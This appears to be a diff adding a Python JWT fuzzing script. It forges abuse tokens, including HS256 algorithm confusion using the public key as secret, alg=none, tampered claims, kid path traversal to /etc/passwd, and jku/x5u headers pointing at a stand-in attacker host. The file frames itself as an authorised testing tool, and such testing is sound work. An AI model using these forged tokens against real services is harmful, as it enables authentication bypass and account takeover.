@@ -1,0 +1,432 @@
+#!/usr/bin/env python3
+"""
+jwt_test_rig.py — Automated JWT verification & fuzzing framework
+
+What it does
+------------
+1) Parses your input JWT, discovers JWKS from payload 'iss' (OIDC discovery; fallback to /.well-known/jwks.json),
+   fetches keys, selects the matching key (by kid/alg), and verifies the original token.
+2) Crafts a suite of negative/abuse tokens your server should reject:
+   - HS256 alg confusion (public key used as HMAC secret) — both PEM bytes & DER bytes (and a keep-kid variant)
+   - alg=none
+   - Wrong algorithms (RS256/PS256/ES384/ES512/HS384)
+   - Claim tampering (iss, aud, exp, nbf, jti)
+   - critical headers + unencoded payload (RFC 7797)
+   - kid traversal/absolute path/URL + jku/x5u external references
+3) Writes all crafted tokens to JSON (default: tokens.json) and shows a preview table.
+
+Install
+-------
+pip install pyjwt cryptography requests
+
+Ethics
+------
+Use only against systems you own or have explicit permission to assess.
+"""
+
+import argparse
+import base64
+import datetime as dt
+import hashlib
+import hmac
+import json
+import sys
+from typing import Any, Dict, List, Optional, Tuple
+
+import jwt
+import requests
+from jwt import PyJWKClient
+from cryptography.hazmat.primitives.asymmetric import ec, rsa
+from cryptography.hazmat.primitives.serialization import load_pem_public_key, Encoding, PublicFormat
+
+# ==================== helpers ====================
+
+def b64url_encode(b: bytes) -> str:
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")
+
+def b64url_decode(s: str) -> bytes:
+    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+
+def split_jwt(token: str) -> Tuple[str, str, str]:
+    parts = token.split(".")
+    if len(parts) != 3:
+        raise ValueError("Not a 3-part JWT.")
+    return parts[0], parts[1], parts[2]
+
+def json_compact(obj: Dict[str, Any]) -> str:
+    return json.dumps(obj, separators=(",", ":"))
+
+def now_utc() -> int:
+    return int(dt.datetime.now(tz=dt.timezone.utc).timestamp())
+
+def pretty_header_payload(token: str) -> Tuple[Dict[str, Any], Dict[str, Any]]:
+    h_b64, p_b64, _ = split_jwt(token)
+    return json.loads(b64url_decode(h_b64)), json.loads(b64url_decode(p_b64))
+
+# nice output writer: keeps valid JSON but adds a blank line between entries
+def write_tokens_with_blank_lines(tokens: dict, path: str):
+    """
+    Write a JSON object where each top-level entry is separated by a blank line.
+    Output remains valid JSON.
+    """
+    items = list(tokens.items())
+    with open(path, "w") as f:
+        f.write("{\n")
+        for i, (k, v) in enumerate(items):
+            line = '  ' + json.dumps(k) + ': ' + json.dumps(v)
+            f.write(line)
+            if i < len(items) - 1:
+                f.write(",\n\n")  # visually blank line between entries
+            else:
+                f.write("\n")
+        f.write("}\n")
+
+# ==================== OIDC/JWKS discovery ====================
+
+def discover_jwks_uri(issuer: str) -> Optional[str]:
+    iss = issuer.rstrip("/")
+    well_known = f"{iss}/.well-known/openid-configuration"
+    try:
+        r = requests.get(well_known, timeout=10)
+        if r.ok:
+            data = r.json()
+            jwks = data.get("jwks_uri")
+            if jwks:
+                return jwks
+    except Exception:
+        pass
+    return f"{iss}/.well-known/jwks.json"
+
+def fetch_jwks(jwks_uri: str, timeout: int = 10, insecure: bool = False) -> Dict[str, Any]:
+    r = requests.get(jwks_uri, timeout=timeout, verify=not insecure)
+    r.raise_for_status()
+    return r.json()
+
+def select_jwk_for_token(jwks: Dict[str, Any], token_header: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+    kid = token_header.get("kid")
+    alg = token_header.get("alg")
+    keys = jwks.get("keys", [])
+    if kid:
+        for k in keys:
+            if k.get("kid") == kid:
+                return k
+    for k in keys:
+        if k.get("use") == "sig" and (not alg or k.get("alg") == alg):
+            return k
+    return keys[0] if keys else None
+
+# ==================== Key handling ====================
+
+def jwk_to_public_key(jwk: Dict[str, Any]):
+    kty = jwk.get("kty")
+    if kty == "EC":
+        x = int.from_bytes(b64url_decode(jwk["x"]), "big")
+        y = int.from_bytes(b64url_decode(jwk["y"]), "big")
+        curve = ec.SECP256R1()
+        pub_nums = ec.EllipticCurvePublicNumbers(x, y, curve)
+        return pub_nums.public_key()
+    elif kty == "RSA":
+        n = int.from_bytes(b64url_decode(jwk["n"]), "big")
+        e = int.from_bytes(b64url_decode(jwk["e"]), "big")
+        pub_nums = rsa.RSAPublicNumbers(e, n)
+        return pub_nums.public_key()
+    else:
+        raise ValueError(f"Unsupported kty: {kty}")
+
+def pem_from_jwk(jwk: Dict[str, Any]) -> bytes:
+    pub = jwk_to_public_key(jwk)
+    return pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
+
+def der_from_pem(pem: bytes) -> bytes:
+    lines = pem.decode().strip().splitlines()
+    body = "".join([ln for ln in lines if not ln.startswith("-----")])
+    return base64.b64decode(body)
+
+# ==================== Verification ====================
+
+def verify_original_jwt(token: str, jwks_uri: str) -> Tuple[bool, Optional[str]]:
+    try:
+        jwk_client = PyJWKClient(jwks_uri)
+        signing_key = jwk_client.get_signing_key_from_jwt(token)
+        jwt.decode(
+            token,
+            signing_key.key,
+            algorithms=[
+                "ES256","ES384","ES512","RS256","RS384","RS512","PS256","PS384","PS512"
+            ],
+            options={"verify_aud": False},
+        )
+        return True, None
+    except Exception as e:
+        return False, str(e)
+
+# ==================== Crafting ====================
+
+def re_sign_hs256(message: bytes, secret: bytes) -> str:
+    sig = hmac.new(secret, message, hashlib.sha256).digest()
+    return b64url_encode(sig)
+
+def forge_with_header_payload(header: Dict[str, Any], payload_b64: str,
+                              secret: Optional[bytes], alg: str) -> str:
+    """
+    Build a token with the given header and payload.
+    - For HS* algorithms:
+        * If 'secret' is provided => produce a real HMAC signature (used for confusion tests).
+        * If 'secret' is None     => emit a dummy signature (used for 'wrong alg HS*' tests).
+    - For non-HS algorithms: emit a dummy signature (on purpose).
+    """
+    header_b64 = b64url_encode(json_compact(header).encode())
+    if alg.startswith("HS"):
+        if secret is None:
+            sig_b64 = "invalidsignature"
+        else:
+            sig_b64 = re_sign_hs256(f"{header_b64}.{payload_b64}".encode(), secret)
+    else:
+        sig_b64 = "invalidsignature"
+    return f"{header_b64}.{payload_b64}.{sig_b64}"
+
+TEST_IDS: List[str] = [
+    "hs256_confusion_pem_bytes",
+    "hs256_confusion_der_bytes",
+    "hs256_confusion_keep_kid",
+    "alg_none",
+    "wrong_alg_RS256",
+    "wrong_alg_PS256",
+    "wrong_alg_ES384",
+    "wrong_alg_ES512",
+    "wrong_alg_HS384",
+    "tamper_iss",
+    "tamper_aud",
+    "tamper_expired",
+    "tamper_nbf_future",
+    "tamper_jti_new",
+    "crit_b64_false_unencoded_payload",
+    "kid_traversal",
+    "kid_absolute_path",
+    "kid_url",
+    "jku_external",
+    "x5u_external",
+]
+
+def craft_suite(original: str, jwk: Dict[str, Any], include: Optional[List[str]] = None,
+                exclude: Optional[List[str]] = None) -> Dict[str, str]:
+    inc = set(include or TEST_IDS)
+    exc = set(exclude or [])
+    wanted = [t for t in TEST_IDS if t in inc and t not in exc]
+
+    tokens: Dict[str, str] = {}
+    header, payload = pretty_header_payload(original)
+    header_orig = dict(header)
+    payload_orig = dict(payload)
+    header_b64, payload_b64, _ = split_jwt(original)
+
+    pem = pem_from_jwk(jwk)
+    der = der_from_pem(pem)
+
+    def add(name: str, token: str):
+        if name in wanted:
+            tokens[name] = token
+
+    # 1) HS256 confusion (public key used as secret)
+    add("hs256_confusion_pem_bytes",
+        forge_with_header_payload({k:v for k,v in header_orig.items() if k!="kid"} | {"alg":"HS256","typ":"JWT"},
+                                  payload_b64, pem, "HS256"))
+    add("hs256_confusion_der_bytes",
+        forge_with_header_payload({k:v for k,v in header_orig.items() if k!="kid"} | {"alg":"HS256","typ":"JWT"},
+                                  payload_b64, der, "HS256"))
+    add("hs256_confusion_keep_kid",
+        forge_with_header_payload(header_orig | {"alg":"HS256"}, payload_b64, pem, "HS256"))
+
+    # 2) alg=none
+    add("alg_none",
+        f"{b64url_encode(json_compact({'alg':'none','typ':'JWT'}).encode())}.{payload_b64}.")
+
+    # 3) Wrong algorithm variants (emit invalid signatures on purpose)
+    for bad_alg in ["RS256","PS256","ES384","ES512"]:
+        add(f"wrong_alg_{bad_alg}",
+            forge_with_header_payload({k:v for k,v in header_orig.items() if k!='kid'} | {"alg":bad_alg,"typ":"JWT"},
+                                      payload_b64, None, bad_alg))
+    # Include HS384 as a wrong-alg test using dummy signature (no crash now)
+    add("wrong_alg_HS384",
+        forge_with_header_payload({k:v for k,v in header_orig.items() if k!='kid'} | {"alg":"HS384","typ":"JWT"},
+                                  payload_b64, None, "HS384"))
+
+    # 4) Claim tampering (signature placeholder so verifier should reject)
+    def tamper_payload(mut: Dict[str, Any]) -> str:
+        p_b64 = b64url_encode(json_compact(mut).encode())
+        h_b64 = b64url_encode(json_compact(header_orig).encode())
+        return f"{h_b64}.{p_b64}.invalidsignature"
+
+    p = dict(payload_orig); p["iss"] = "https://evil.example.com/"; add("tamper_iss", tamper_payload(p))
+    p = dict(payload_orig); p["aud"] = "wrong-audience";            add("tamper_aud", tamper_payload(p))
+    p = dict(payload_orig); p["exp"] = now_utc() - 3600;            add("tamper_expired", tamper_payload(p))
+    p = dict(payload_orig); p["nbf"] = now_utc() + 3600;            add("tamper_nbf_future", tamper_payload(p))
+    p = dict(payload_orig); p["jti"] = f"replay-{now_utc()}";       add("tamper_jti_new", tamper_payload(p))
+
+    # 5) crit + b64:false unencoded payload (RFC 7797)
+    hdr_unencoded = {"alg":"HS256","typ":"JWT","b64":False,"crit":["b64"]}
+    h_b64 = b64url_encode(json_compact(hdr_unencoded).encode())
+    raw_payload = b"raw-payload-not-base64"
+    sig_unenc = b64url_encode(hmac.new(pem, f"{h_b64}.".encode() + raw_payload, hashlib.sha256).digest())
+    add("crit_b64_false_unencoded_payload", f"{h_b64}.{raw_payload.decode()}.{sig_unenc}")
+
+    # 6) kid/jku/x5u abuse
+    add("kid_traversal",      forge_with_header_payload(header_orig | {"kid":"../../etc/passwd","alg":"HS256"}, payload_b64, pem, "HS256"))
+    add("kid_absolute_path",  forge_with_header_payload(header_orig | {"kid":"/var/www/keys/priv.pem","alg":"HS256"}, payload_b64, pem, "HS256"))
+    add("kid_url",            forge_with_header_payload(header_orig | {"kid":"http://attacker.invalid/evil","alg":"HS256"}, payload_b64, pem, "HS256"))
+    add("jku_external",       forge_with_header_payload(header_orig | {"alg":"RS256","jku":"http://attacker.invalid/jwks.json"}, payload_b64, None, "RS256"))
+    add("x5u_external",       forge_with_header_payload(header_orig | {"alg":"RS256","x5u":"http://attacker.invalid/cert.pem"}, payload_b64, None, "RS256"))
+
+    return tokens
+
+# ==================== CLI ====================
+
+def build_parser() -> argparse.ArgumentParser:
+    epilog = r"""
+Examples:
+  # Basic run: discover JWKS from 'iss' in the token and craft all tests
+  jwt_test_rig.py -t '<JWT>'
+
+  # Provide audience for stricter verification of the original token
+  jwt_test_rig.py -t '<JWT>' --aud 'my-audience'
+
+  # Override JWKS URI (custom IdP or non-OIDC issuer)
+  jwt_test_rig.py -t '<JWT>' --jwks-uri 'https://idp.example.com/.well-known/jwks.json'
+
+  # Only generate a subset of tests
+  jwt_test_rig.py -t '<JWT>' --include hs256_confusion_pem_bytes,alg_none
+
+  # Exclude some tests
+  jwt_test_rig.py -t '<JWT>' --exclude kid_url,jku_external,x5u_external
+
+  # Pretty output file with a blank line between entries
+  jwt_test_rig.py -t '<JWT>' --pretty-blank-lines -o tokens.json
+
+Test IDs (usable with --include/--exclude):
+  hs256_confusion_pem_bytes
+  hs256_confusion_der_bytes
+  hs256_confusion_keep_kid
+  alg_none
+  wrong_alg_RS256
+  wrong_alg_PS256
+  wrong_alg_ES384
+  wrong_alg_ES512
+  wrong_alg_HS384
+  tamper_iss
+  tamper_aud
+  tamper_expired
+  tamper_nbf_future
+  tamper_jti_new
+  crit_b64_false_unencoded_payload
+  kid_traversal
+  kid_absolute_path
+  kid_url
+  jku_external
+  x5u_external
+
+Notes:
+  • This tool fetches keys from the issuer’s JWKS (via OIDC discovery or fallback).
+  • All crafted tokens are written to JSON; you can feed them into your API tests.
+  • Only test systems you own or have explicit permission to assess.
+"""
+    parser = argparse.ArgumentParser(
+        prog="jwt_test_rig.py",
+        description=(
+            "Automated JWT verification & fuzzing harness.\n"
+            "• Discovers JWKS from token 'iss' (OIDC), verifies the original token.\n"
+            "• Crafts multiple negative/abuse tokens (alg confusion, none, wrong algs, claim tampering,\n"
+            "  critical headers, kid/jku/x5u abuse) and saves them for testing.\n"
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=epilog,
+    )
+    parser.add_argument("-t", "--token", required=True, help="Original JWT (three-part compact form).")
+    parser.add_argument("--jwks-uri", help="Override JWKS URI. If omitted, discovered from 'iss' in payload.")
+    parser.add_argument("--aud", help="Expected audience for additional verification of the original token.")
+    parser.add_argument("-o", "--out", default="tokens.json", help="Output JSON file for crafted tokens (default: tokens.json).")
+    parser.add_argument("--print-payload", action="store_true", help="Print parsed header and payload of the input JWT.")
+    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout (seconds) for discovery/JWKS fetch (default: 10).")
+    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification for JWKS fetch (NOT recommended).")
+    parser.add_argument("--include", help="Comma-separated list of test IDs to include (defaults to all).")
+    parser.add_argument("--exclude", help="Comma-separated list of test IDs to exclude.")
+    parser.add_argument("--pretty-blank-lines", action="store_true",
+                        help="Write tokens.json with a blank line between each top-level entry for readability.")
+    return parser
+
+def main():
+    parser = build_parser()
+    args = parser.parse_args()
+
+    token = args.token.strip()
+    try:
+        header, payload = pretty_header_payload(token)
+    except Exception as e:
+        print(f"[!] Failed to parse input token: {e}", file=sys.stderr)
+        sys.exit(1)
+
+    if args.jwks_uri:
+        jwks_uri = args.jwks_uri
+    else:
+        iss = payload.get("iss")
+        if not iss:
+            print("[!] No 'iss' in payload and no --jwks-uri provided; cannot discover JWKS.", file=sys.stderr)
+            sys.exit(1)
+        jwks_uri = discover_jwks_uri(iss)
+
+    print(f"[+] Using JWKS URI: {jwks_uri}")
+    ok, err = verify_original_jwt(token, jwks_uri)
+    if ok:
+        print("[+] Original token: SIGNATURE VALID")
+    else:
+        print(f"[!] Original token FAILED verification: {err}")
+
+    # Fetch JWKS
+    try:
+        jwks = fetch_jwks(jwks_uri, timeout=args.timeout, insecure=args.insecure)
+    except Exception as e:
+        print(f"[!] Failed to fetch JWKS: {e}", file=sys.stderr)
+        sys.exit(1)
+
+    jwk = select_jwk_for_token(jwks, header)
+    if not jwk:
+        print("[!] Could not select a matching JWK (kid/alg).", file=sys.stderr)
+        sys.exit(1)
+
+    print(f"[+] Selected JWK kid={jwk.get('kid')} kty={jwk.get('kty')} alg={jwk.get('alg')} use={jwk.get('use')}")
+
+    if args.print_payload:
+        print("\n--- Header ---")
+        print(json.dumps(header, indent=2, sort_keys=True))
+        print("--- Payload ---")
+        print(json.dumps(payload, indent=2, sort_keys=True))
+
+    include = args.include.split(",") if args.include else None
+    exclude = args.exclude.split(",") if args.exclude else None
+
+    try:
+        crafted = craft_suite(token, jwk, include=include, exclude=exclude)
+    except Exception as e:
+        print(f"[!] Failed to craft tokens: {e}", file=sys.stderr)
+        sys.exit(1)
+
+    if args.pretty_blank_lines:
+        write_tokens_with_blank_lines(crafted, args.out)
+    else:
+        with open(args.out, "w") as f:
+            json.dump(crafted, f, indent=2)
+    print(f"[+] Wrote {len(crafted)} crafted tokens → {args.out}\n")
+
+    print("Name".ljust(34), "Preview")
+    print("-" * 120)
+    for name, tok in crafted.items():
+        print(name.ljust(34), tok[:110] + ("..." if len(tok) > 110 else ""))
+
+if __name__ == "__main__":
+    # small retries and safe defaults
+    requests.adapters.DEFAULT_RETRIES = 1
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user.", file=sys.stderr)
+        sys.exit(130)
+
